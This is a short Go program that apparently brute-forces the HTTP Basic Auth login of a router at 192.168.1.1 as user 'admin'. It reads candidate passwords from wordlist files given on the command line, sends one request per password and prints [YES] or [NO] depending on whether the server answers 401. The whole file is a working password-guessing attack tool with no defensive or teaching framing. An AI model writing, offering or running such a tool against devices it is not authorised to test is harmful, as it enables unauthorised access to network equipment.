package main

import (
	"github.com/yetist/crack"
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
)

type Route struct {
	url      string
	username string
}

func (rt Route) GenEntry(path string, entry chan<- string) {
	f, err := os.Open(path)
	defer f.Close()
	if err == nil {
		buff := bufio.NewReader(f)
		for {
			line, err := buff.ReadString('\n')
			if err != nil || err == io.EOF {
				fmt.Printf("get end of %s\n", path)
				break
			}
			word := strings.Trim(line, " \r\n")
			entry <- word
		}
	}
}

func (rt Route) CrackIt(pass string) (ok bool, err error) {
	ok = false
	client := &http.Client{}
	req, err := http.NewRequest("GET", rt.url, nil)
	if err != nil {
		return
	}
	req.SetBasicAuth(rt.username, pass)
	resp, err := client.Do(req)
	defer resp.Body.Close()
	if err != nil {
		return
	}
	if resp.StatusCode == 401 {
		fmt.Printf("[NO][%s]\n", pass)
	} else {
		fmt.Printf("[YES][%s]\n", pass)
	}
	return
}

func main() {
	route := Route{url: "http://192.168.1.1", username: "admin"}
	files := os.Args[1:]
	if len(files) == 0 {
		fmt.Printf("Usage:\n%s <file ...>\n", os.Args[0])
	} else {
		crack.Crack(files, route)
	}
}
